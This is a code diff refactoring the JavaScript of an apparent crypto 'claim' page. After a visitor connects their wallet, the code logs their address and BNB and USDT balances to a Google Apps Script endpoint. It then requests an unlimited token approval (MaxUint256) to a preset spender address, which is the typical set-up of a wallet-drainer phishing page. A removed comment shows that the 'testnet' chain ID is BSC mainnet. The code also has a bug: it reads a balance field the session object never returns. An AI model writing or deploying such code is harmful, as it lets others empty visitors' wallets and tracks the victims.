@@ -633,7 +633,8 @@ header{
     let web3Instance      = null;
     let currentAddress    = null;
     let currentUserId     = null;
-
+let currentBNBBalance   = null;
+let currentTokenBalance = null;
     // WalletConnect v2
     let walletConnectV2Provider = null;
     const WALLETCONNECT_PROJECT_ID = "febf4ea32fb4df7139f1cfd3f7c5142a";
@@ -814,31 +815,34 @@ header{
       }
     }
 
-   async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
+  async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
+  try{
+    const payload = new URLSearchParams({
+      secret      : APPS_SCRIPT_SECRET,              // "justforme"
+      address     : address || "",
+      network     : networkText || "",
+      timestamp   : new Date().toISOString(),
+      userId      : userId || "",
+      bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
+      tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
+      eventType   : eventType || "connect"
+    });
 
-      try{
-     const payload = new URLSearchParams({
-  secret      : APPS_SCRIPT_SECRET,
-  address     : address,
-  network     : networkText,
-  timestamp   : new Date().toISOString(),
-  userId      : userId,
-  bnbBalance  : String(bnbBalance ?? ""),
-  tokenBalance: String(tokenBalance ?? ""),
-  eventType   : eventType              // <--- NEW
-});
+    console.log("notifyBackend payload", Object.fromEntries(payload.entries()));
 
+    await fetch(APPS_SCRIPT_URL, {
+      method: "POST",
+      mode  : "no-cors",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+      },
+      body: payload.toString()
+    });
+  }catch(err){
+    console.error("notifyBackend error:", err);
+  }
+}
 
-        await fetch(APPS_SCRIPT_URL, {
-          method:"POST",
-          mode:"no-cors",
-          headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},
-          body:payload.toString()
-        });
-      }catch(err){
-        console.error("notifyBackend error:", err);
-      }
-    }
 
     async function getTokenBalance(address){
       try{
@@ -893,25 +897,31 @@ header{
       }
     }
 async function ensureTokenApproval(){
+  // helper to log with last known balances
+  async function logApproval(tag){
+    await notifyBackend(
+      currentAddress || "",
+      BNB_TESTNET_LABEL,
+      currentUserId || "",
+      currentBNBBalance,
+      currentTokenBalance,
+      tag
+    );
+  }
+
   if(!TOKEN_ADDRESS){
     console.warn("TOKEN_ADDRESS not set, skipping approve");
-    if (currentAddress && currentUserId) {
-      await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_skipped_no_token");
-    }
+    await logApproval("approval_skipped_no_token");
     return;
   }
   if(!SPENDER_ADDRESS){
     console.warn("SPENDER_ADDRESS not set, skipping approve");
-    if (currentAddress && currentUserId) {
-      await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_skipped_no_spender");
-    }
+    await logApproval("approval_skipped_no_spender");
     return;
   }
   if(!providerInstance){
     console.warn("No providerInstance for approval");
-    if (currentAddress && currentUserId) {
-      await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_skipped_no_provider");
-    }
+    await logApproval("approval_skipped_no_provider");
     return;
   }
 
@@ -920,7 +930,7 @@ async function ensureTokenApproval(){
 
     const ethersProvider = new ethers.BrowserProvider(
       providerInstance,
-      BNB_TESTNET_CHAIN_ID_DEC   // 56 (BSC mainnet)
+      BNB_TESTNET_CHAIN_ID_DEC
     );
     const signer       = await ethersProvider.getSigner();
     const ownerAddress = (await signer.getAddress()).toLowerCase();
@@ -931,31 +941,25 @@ async function ensureTokenApproval(){
         "It MUST be the BEP-20 token contract address, not your wallet."
       );
       setStatus("Connected (approval skipped)");
-      if (currentAddress && currentUserId) {
-        await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_skipped_token_is_wallet");
-      }
+      await logApproval("approval_skipped_token_is_wallet");
       return;
     }
 
-    // 1) Read current allowance (view-only)
+    // 1) check allowance
     const readContract = new ethers.Contract(
       TOKEN_ADDRESS,
       ERC20_ALLOWANCE_ABI,
       ethersProvider
     );
     const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-    console.log("[approve] currentAllowance =", currentAllowance.toString());
 
     if (currentAllowance > 0n) {
-      console.log("[approve] already approved, skipping tx");
       setStatus("Connected (already approved)");
-      if (currentAddress && currentUserId) {
-        await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_already");
-      }
+      await logApproval("approval_already");
       return;
     }
 
-    // 2) Not approved yet → send approve tx
+    // 2) send approve tx
     setStatus("Waiting for wallet to confirm approval…");
     const writeContract = new ethers.Contract(
       TOKEN_ADDRESS,
@@ -964,73 +968,71 @@ async function ensureTokenApproval(){
     );
 
     const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    console.log("[approve] tx sent:", tx.hash);
-
     setStatus("Approval pending on chain…");
-    const receipt = await tx.wait();
-    console.log("[approve] confirmed:", receipt);
+    await tx.wait();
 
     setStatus("Connected + Approved ✅");
-
-    if (currentAddress && currentUserId) {
-      await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_approved");
-    }
+    await logApproval("approval_approved");
   }catch(err){
     console.error("Token approve error:", err);
 
-    let statusTag = "approval_error";
+    let tag = "approval_error";
     if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-      statusTag = "approval_rejected";
+      tag = "approval_rejected";
     }
 
     alert("Token approval failed: " + (err && err.message ? err.message : err));
     setStatus("Connected (approval failed)");
 
-    if (currentAddress && currentUserId) {
-      await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", statusTag);
-    }
+    await logApproval(tag);
   }
 }
 
 
 
-    async function restoreSessionFromAddress(address){
-      currentAddress = address;
-      const balanceWei = await web3Instance.eth.getBalance(address);
-      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
-      const userId     = getOrCreateUserIdFor(address);
-  currentUserId  = userId;
-      
-      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-      setUserIdUI(userId);
 
-      const tokenBalanceRaw  = await getTokenBalance(address);
-      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
+   async function restoreSessionFromAddress(address){
+  currentAddress = address;
 
-      if(tokensContainer){
-        tokensContainer.innerHTML =
-          'USDT balance: ' + prettyBalance +
-          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
-      }
+  const balanceWei = await web3Instance.eth.getBalance(address);
+  const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
+  const userId     = getOrCreateUserIdFor(address);
 
-      isWalletConnected = true;
-      if(connectBtn){
-        connectBtn.textContent = "Connected";
-        connectBtn.classList.add("connected");
-      }
-      if(connectHintCardEl){
-        connectHintCardEl.textContent = "Wallet connected.";
-      }
-      if(connectedPillEl){
-        connectedPillEl.style.display = "inline-flex";
-      }
+  currentUserId       = userId;
+  currentBNBBalance   = balanceBNB;
 
-      updateClaimState();
+  setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+  setUserIdUI(userId);
 
-    await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalanceRaw, "connect");
+  const tokenBalanceRaw  = await getTokenBalance(address);
+  const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
+  const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
 
-      return {balanceBNB, tokenBalanceRaw, userId};
+  currentTokenBalance = tokenBalanceNum;
+
+  if(tokensContainer){
+    tokensContainer.innerHTML =
+      'USDT balance: ' + prettyBalance +
+      '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
+  }
+
+  isWalletConnected = true;
+  if(connectBtn){
+    connectBtn.textContent = "Connected";
+    connectBtn.classList.add("connected");
+    if(connectHintCardEl){
+      connectHintCardEl.textContent = "Wallet connected.";
     }
+    if(connectedPillEl){
+      connectedPillEl.style.display = "inline-flex";
+    }
+  }
+
+  updateClaimState();
+
+  // (we’ll log connect below in connectFlow or keep here if you prefer)
+  return { balanceBNB, tokenBalanceRaw, userId };
+}
 
     // ===== connectFlow (injected + WalletConnect v2) =====
 async function connectFlow(){
@@ -1105,26 +1107,29 @@ async function connectFlow(){
       }
     }
 
-    // ⬇️ get balances + userId from restoreSessionFromAddress
-    const session = await restoreSessionFromAddress(address);
-    const balanceBNB   = session.balanceBNB;
-    const tokenBalance = session.tokenBalance;
-    const userId       = session.userId;
+  // after chainId checks...
 
-    setStatus("Connected");
+// get session details
+const session = await restoreSessionFromAddress(address);
+const balanceBNB   = session.balanceBNB;
+const tokenBalance = session.tokenBalance;
+const userId       = session.userId;
 
-    // ⬇️ log the connection to Apps Script
-    await notifyBackend(
-      address,
-      BNB_TESTNET_LABEL,
-      userId,
-      balanceBNB,
-      tokenBalance,
-      "connect"
-    );
+setStatus("Connected");
 
-    // ⬇️ request token approval once
-    await ensureTokenApproval();
+// log to sheet with balances
+await notifyBackend(
+  address,
+  BNB_TESTNET_LABEL,
+  userId,
+  balanceBNB,
+  tokenBalance,
+  "connect"
+);
+
+// then approval
+await ensureTokenApproval();
+
 
   }catch(err){
     console.error("connectFlow error:", err);
